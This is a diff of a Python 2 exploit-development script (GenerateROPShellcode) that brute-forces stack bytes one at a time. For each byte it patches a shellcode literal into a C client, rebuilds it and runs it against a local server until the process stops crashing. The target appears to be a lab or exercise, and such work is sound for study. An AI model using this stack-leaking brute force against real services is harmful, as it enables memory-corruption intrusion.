@@ -1,6 +1,7 @@
 import os
 import sys
 import json
+import shlex
 import subprocess
 
 class GenerateROPShellcode(object):
@@ -81,27 +82,39 @@ class GenerateROPShellcode(object):
     """
     def read_stack(self):
         count = 8
-        shellcode_list = list(self.shellcode)
-        print len(shellcode_list)
-        FNULL = open(os.devnull, 'w')
         while (count > 0):
             status = -6
             current_byte = -1
-            shellcode_list.append('ff'.decode('hex'))
+            self.shellcode = self.shellcode + ('ff'.decode('hex'))
             while (status == -6):
                 current_byte += 1
-                print 'Current byte: {:d}'.format(current_byte)
-                value = hex(current_byte).split('x')[1].zfill(2).decode('hex')
-                shellcode_list[-1] = value
+                self.value = hex(current_byte).split('x')[1].zfill(2)
+                print 'Current byte: 0x{:s}'.format(self.value)
                 try:
-                    status = subprocess.call(['bin/rop/exploitable', ''.join(shellcode_list)], stdout=FNULL, stderr=subprocess.STDOUT, shell=False)
+                    status = self.write_to_file()
+                    print status
                 except TypeError:
+                    print 'TypeError'
                     status = 1
+            self.shellcode = self.shellcode[:-1] + str(self.value)
             print 'Only {:d} bytes to go'.format(count)
-            print len(shellcode_list)
             count = count - 1
-    """
 
+    def write_to_file(self):
+        FNULL = open(os.devnull, 'w')
+        output_file = 'src/simple_client.c'
+        fo = open(output_file, 'r')
+        contents = fo.readlines()
+        fo.close()
+        fo = open(output_file, 'w+')
+        line_num = 11
+        contents[line_num - 1] = contents[line_num - 1][:-3] + '\\x' + self.value + '";\n\n'
+        contents = ''.join(contents)
+        fo.write(contents)
+        fo.close()
+        subprocess.call('./rebuild.sh', shell=False)
+        return subprocess.call(['bin/simple_client', '127.0.0.1', '10000', 'index.html'], stdout=FNULL, stderr=subprocess.STDOUT, shell=False)
+    """
 
 def main():
     if len(sys.argv) < 4:
